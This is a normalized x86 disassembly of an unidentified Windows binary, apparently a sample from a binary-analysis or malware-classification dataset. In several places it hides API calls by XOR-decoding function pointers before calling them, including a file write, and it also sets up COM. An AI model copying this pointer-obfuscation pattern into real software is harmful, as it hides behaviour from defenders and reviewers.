push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10027fa7
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10023dc9
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10023dc9
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10023dc9
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_1003088d
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_1003088d
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_1004db01
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_100796a0
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_100796a0
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10047009
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_10047009
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1004df80
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov edx [ eax + 0x30 ]
push ebx
push edi
lea ecx [ ebp - 0x44 ]
push ecx
xor edi edi
push esi
xor ebx ebx
mov [ ebp - 0x44 ] edi
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ esi ]
lea edx [ ebp - 0x48 ]
push edx
push eax
mov eax [ ecx + 0x50 ]
push esi
mov [ ebp - 0x48 ] edi
call eax
mov eax [ ebp - 0x48 ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xfa
call sub_100050e0
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ebx 0x4
xor eax eax
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x48 ] edi
jmp r-xdata
inc eax
cmp eax 0x18
jb r-xdata
mov eax [ ebp - 0x40 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x40 ]
cmp eax edi
jne r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1004e070
push ebp
mov ebp esp
push 0xffffffff
push sub_10083076
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
call sub_10003330
lea ebx [ esi + 0x70 ]
mov eax 0x7
xor ecx ecx
xor edx edx
mov [ ebx + 0x14 ] eax
mov [ ebx + 0x10 ] ecx
mov [ ebx ] dx
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x90 ] ecx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ecx
mov [ esi + 0x94 ] ax
mov [ ebp - 0x4 ] 0x1
mov edx edi
mov [ esi + 0xb0 ] ecx
mov eax [ edx + 0x30 ]
cmp eax ecx
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x34 ]
mov [ esi + 0xb0 ] eax
push r--data
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp + 0xc ] ecx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push 0x60000000
push ebx
call [ ebp + 0xc ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ebx [ ebx ]
mov eax edi
mov edx [ eax + 0x30 ]
mov eax edx
lea ecx [ eax + 0x2 ]
mov [ ebp + 0xc ] ecx
lea ebx [ ebx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ rw-data ]
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push ebx
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push ecx
push edi
call [ ebp + 0xc ]
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
call [ ebp + 0xc ]
xor eax eax
cmp [ ebp - 0x10 ] ebx
sete al
mov [ esi + 0x8 ] eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0xc ]
lea ecx [ esi + 0x94 ]
sar eax 0x1
push eax
push edx
call sub_100531b0
jmp r-xdata
mov ecx esi
call sub_10053cd0
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
sub_1004e224
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1006a1f7
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1004e2c1
push 0x194
mov eax sub_1007fada
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001552f
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_10059f39
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_10069ce0
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1005f860
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_1000abc0
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10020b50
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10020b50
mov eax [ ebp - 0x188 ]
call sub_1004fa89
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0xd
call sub_1003cdcb
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_10069ce0
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10028071
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1001ce05
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_1004ff82
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_1003088d
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_10051f6c
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_10023e65
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10023e65
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_1004ff82
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1005576a
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1005f860
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_10020b50
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_10020b50
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1005576a
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_100202c4
or [ ebp - 0x168 ] 0x4
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1005576a
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_1004ff82
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10036380
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_100202c4
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_10020b50
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_10041a20
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_10023e65
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_10020b50
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_10008430
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
add edi 0x2
call sub_1005576a
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_10020b50
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10008430
mov ecx esi
call sub_1005576a
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_1004ff82
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_10020b50
test edi edi
je r-xdata
mov ecx esi
call sub_1005576a
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_100202c4
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10036380
push 0x0
push 0x1
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_10020b50
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ ebp - 0x17c ]
cmp eax [ ebp - 0x184 ]
jge r-xdata
mov eax [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_10041a20
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_100202c4
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_10020b50
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_10023e65
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_10023e65
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10008430
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1005576a
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_10008430
inc [ ebp - 0x17c ]
mov ecx esi
call sub_10023e65
sub_1004ec6c
push 0x10
push r--data
call sub_10079bf0
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10079c35
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_100532a0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_1005ed21
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004ed38
mov eax [ ebp - 0x1c ]
sub_1004ed40
push ebp
mov ebp esp
push 0xffffffff
push sub_1008116b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x170
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push ebx
mov esi ecx
mov [ ebp - 0xd4 ] eax
call [ CoInitializeEx@IAT ]
test eax eax
js r-xdata
mov eax 0x1
jmp r-xdata
push ebx
push ebx
push ebx
push 0x3
push 0x6
push ebx
push ebx
push 0xffffffff
push ebx
call [ CoInitializeSecurity@IAT ]
cmp eax ebx
jge r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor ecx ecx
mov eax esi
mov [ ebp - 0xa4 ] 0x7
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xb8 ] cx
lea edx [ eax + 0x2 ]
cmp eax 0x80010119
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xb8 ]
call sub_100531b0
lea edx [ ebp - 0xcc ]
push edx
push r--data
push 0x1
push ebx
mov [ ebp - 0x4 ] ebx
push r--data
mov [ ebp - 0xcc ] ebx
call [ CoCreateInstance@IAT ]
cmp eax ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov esi [ VariantInit@IAT ]
lea ecx [ ebp - 0x144 ]
push ecx
call esi
mov edx [ ebp - 0x140 ]
mov eax [ ebp - 0x13c ]
mov ecx [ ebp - 0x138 ]
mov edi [ ebp - 0x144 ]
mov [ ebp - 0x128 ] edx
lea edx [ ebp - 0x154 ]
push edx
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] ecx
call esi
mov ecx [ ebp - 0x150 ]
mov eax [ ebp - 0x154 ]
mov edx [ ebp - 0x14c ]
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x10c ] eax
mov eax [ ebp - 0x148 ]
lea ecx [ ebp - 0x164 ]
push ecx
mov [ ebp - 0x104 ] edx
mov [ ebp - 0x100 ] eax
call esi
mov eax [ ebp - 0x160 ]
mov edx [ ebp - 0x164 ]
mov ecx [ ebp - 0x15c ]
mov [ ebp - 0xf0 ] eax
mov [ ebp - 0xf4 ] edx
mov edx [ ebp - 0x158 ]
lea eax [ ebp - 0x17c ]
push eax
mov [ ebp - 0xec ] ecx
mov [ ebp - 0xe8 ] edx
call esi
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x128 ]
sub esp 0x10
mov eax esp
mov [ eax ] edi
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x124 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x120 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0x10c ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0x108 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0x104 ]
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x100 ]
mov [ eax + 0xc ] esi
mov esi [ ebp - 0xf4 ]
mov ecx [ ebp - 0xcc ]
mov edx [ ecx ]
sub esp 0x10
mov eax esp
mov [ eax ] esi
mov esi [ ebp - 0xf0 ]
mov [ eax + 0x4 ] esi
mov esi [ ebp - 0xec ]
mov [ eax + 0x8 ] esi
